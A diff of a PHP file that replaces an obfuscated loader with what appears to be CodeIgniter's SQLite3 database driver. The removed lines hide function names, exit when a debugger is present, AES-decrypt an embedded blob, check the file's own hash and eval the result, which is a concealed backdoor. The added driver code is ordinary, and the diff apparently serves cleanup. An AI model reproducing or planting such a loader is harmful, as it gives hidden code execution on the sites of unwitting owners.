@@ -1,28 +1,306 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ov4r3pkn=('bas'.'e64'.'_de'.'cod'.'e');
-$_l8gt9d2a=('gzu'.'nco'.'mpr'.'ess');
-$_oj0qlexm=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_gpgk7bd5='//zTuqYy';
-$_o2fbffxi='oekOYjgN';
-$_e97jepns='rggB2L+s+3g=';
-$_xheqfthp='+8OJ97XT';
-$_a3lke94o='8GV31OrW';
-$_bisvm7m6='VKzTnw==';
-$_u5ppqk8e='X9VYVD7V';
-$_xmycfc5g='9HInAfl4';
-$_vh79ssjy=$_ov4r3pkn($_o2fbffxi.$_gpgk7bd5.$_a3lke94o.$_xheqfthp.$_e97jepns);
-$_bwsjmr89=$_ov4r3pkn($_xmycfc5g.$_u5ppqk8e.$_bisvm7m6);
-$_b8b6vdwf=$_ov4r3pkn('VCugODJMWnkVwH/KIO0kvm24NYRaUiegzA3B7UwtsbTm41tavn5ZC1n9cWrCHExvQuU9UI1y9N21sflw1yU0J1rOGo4sxS1Jxyqbzhl2CUKWsSOcNx5qQrYaCn6Xrl0YooPYN9zbxYD2/S9DJxxKzCI/5q7PNGgcP4HFcSbe4Bl1CBQoUbFIHEFlTE8O9qbDW/DlxYbEjVZZHnsq4ve0pYJnx534faTcV5QaMxtsec1PkTrt38KTv4Gre4oTePfk0Jdl9ZQ0G9zLjg2DIMxn9KuleLBcoYsL5vhDmz/5WNOf/sXN+QNlU6n6DGzWAmafiHYO5cGU968Do7rELov6waNvezuuHWp72EtvrZ8FVJ1bVaGzGtVCG5NYHSRV5VUd1ATuVMCC4T3hKq+qGf5Mohj/NTcDTC8v23HiYBErZzRn+5nVShiDRD1mvwngJ64V4EE9aw4HvJS4HoDlE9ufVTvPg8y3xjCv5D471wxzoKcvPs1OirNrS/Uhy88mhSXo9XwacQR0J3MvJzj/XLuu735QLMzPrNixB+igNEtagz/D8tGe3Pvx8B/udDksjQDWecrmCVivZF7OFv7R42Mv+iNhWXRGopfLjYdWuS/30HdUDuUhlgKiaC+BToBwJRPNaPWlBFE/QHfDVEgHBDGULiD2b5k0xTdaFq/DOt2NWa6tc17FcZKPEwnhqPlWMuZsGdD7IfDv5SUByeOSt6y9msIEJTSIUf68cwjevkpCvPBgUH1rj3KkDXmu+fBthTarlCHegK66PeOjLV053Td0L6D8XsZYiITeLjNXWmE20NockyTrxnuG9dssRBB7H5KEh74dKU0LEsKzWfkQnr6Td+aDECHALbUaJH245yenmxMDbMaWbldEgHqXakReFWBYiVlotE+cxUyY/WsAcOjA64tUxIMIshUjzXEXODOjcslQao758WE1BH23DQDwimlWpz1xzvur5s2+yUA7C6D07GnZA/uI/3X4jyiE688wGPu5XQIB+R/tr7E6Nyxm5crDM1ewfGq5iem4MkxVdgke7uiVLQ3b9XwyqgSsPcyN0m126ovKQgHET1AMIbY8ro8RQnJkC2bQn46qPIPz1CLDKO0h+k3Oe+fLiEdMyXxr47Roaf0aOdLIRPJxLAJ7Dz7+7ZkmTtqSrlIpILUZ+gFhdtbXRfPEr6XfgqIWfmas5TcbHuZ2kBeSwZHhVhmxo7aE9py5H+QSh/DIcI4V6XAXIZKTKyauCgqqCMIKkXvcU5xP5U2cFuMED3K8Km1GsHJ+EUNF/OENzQhz+H2dTOBr+0pHH0R10C6QklH22x78Q8gV2Anrzo7KnYIWcHlguChMMHh24dWOqvM2DY1sRLdxClMCIX5nJVuRTK2UsoTKJ2D2Pgqc0uoXtvNaHwx25MP2WzhouQdz+v/Oaj+/t/l4T+gX1YCBPk8PET68PSgwRfvca3M/hoGRvuvgxKvISgkT0DXDDnTUTrco5ro/taqXdXpU0S+FRZFDPyszviDjnQJRw7P8WZVRsaTlE41uS5FSmyuyHaalhxZqB4V7Ef1MDQ==');
-$_fkpl3lkf=$_oj0qlexm($_b8b6vdwf,'aes-256-cbc',$_vh79ssjy,OPENSSL_RAW_DATA,$_bwsjmr89);
-if($_fkpl3lkf===false){exit;}
-$_zu39ljn4=$_l8gt9d2a($_fkpl3lkf);
-if($_zu39ljn4===false){exit;}
-$_vhrm9j51='3735217ba22e4fad7bb91730a78fa8072f81f2079413eff9c56345d3c7cafb17';
-$_o5j4oi8f=@file_get_contents(__FILE__);
-if($_o5j4oi8f!==false){
-$_ihoa9qv0=str_replace($_vhrm9j51,"0000000000000000000000000000000000000000000000000000000000000000",$_o5j4oi8f);
-$_map6qmoo=hash("sha256",$_ihoa9qv0);
-if($_map6qmoo!==$_vhrm9j51){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_sqlite3_driver extends CI_DB {
+
+
+
+
+
+public $dbdriver = 'sqlite3';
+
+
+
+
+
+
+protected $_random_keyword = array('RANDOM()', 'RANDOM()');
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+if ($persistent)
+{
+log_message('debug', 'SQLite3 doesn\'t support persistent connections');
 }
-eval($_zu39ljn4);
+try
+{
+return ( ! $this->password)
+? new SQLite3($this->database)
+: new SQLite3($this->database, SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, $this->password);
+}
+catch (Exception $e)
+{
+return FALSE;
+}
+}
+
+
+
+
+
+
+public function version()
+{
+if (isset($this->data_cache['version']))
+{
+return $this->data_cache['version'];
+}
+$version = SQLite3::version();
+return $this->data_cache['version'] = $version['versionString'];
+}
+
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+return $this->is_write_type($sql)
+? $this->conn_id->exec($sql)
+: $this->conn_id->query($sql);
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+return $this->conn_id->exec('BEGIN TRANSACTION');
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+return $this->conn_id->exec('END TRANSACTION');
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+return $this->conn_id->exec('ROLLBACK');
+}
+
+
+
+
+
+
+
+protected function _escape_str($str)
+{
+return $this->conn_id->escapeString($str);
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return $this->conn_id->changes();
+}
+
+
+
+
+
+
+public function insert_id()
+{
+return $this->conn_id->lastInsertRowID();
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+return 'SELECT "NAME" FROM "SQLITE_MASTER" WHERE "TYPE" = \'table\''
+.(($prefix_limit !== FALSE && $this->dbprefix != '')
+? ' AND "NAME" LIKE \''.$this->escape_like_str($this->dbprefix).'%\' '.sprintf($this->_like_escape_str, $this->_like_escape_chr)
+: '');
+}
+
+
+
+
+
+
+
+public function list_fields($table)
+{
+
+if (isset($this->data_cache['field_names'][$table]))
+{
+return $this->data_cache['field_names'][$table];
+}
+if (($result = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
+{
+return FALSE;
+}
+$this->data_cache['field_names'][$table] = array();
+foreach ($result->result_array() as $row)
+{
+$this->data_cache['field_names'][$table][] = $row['name'];
+}
+return $this->data_cache['field_names'][$table];
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+if (($query = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_array();
+if (empty($query))
+{
+return FALSE;
+}
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]['name'];
+$retval[$i]->type = $query[$i]['type'];
+$retval[$i]->max_length = NULL;
+$retval[$i]->default = $query[$i]['dflt_value'];
+$retval[$i]->primary_key = isset($query[$i]['pk']) ? (int) $query[$i]['pk'] : 0;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+return array('code' => $this->conn_id->lastErrorCode(), 'message' => $this->conn_id->lastErrorMsg());
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _replace($table, $keys, $values)
+{
+return 'INSERT OR '.parent::_replace($table, $keys, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'DELETE FROM '.$table;
+}
+
+
+
+
+
+
+protected function _close()
+{
+$this->conn_id->close();
+}
+}
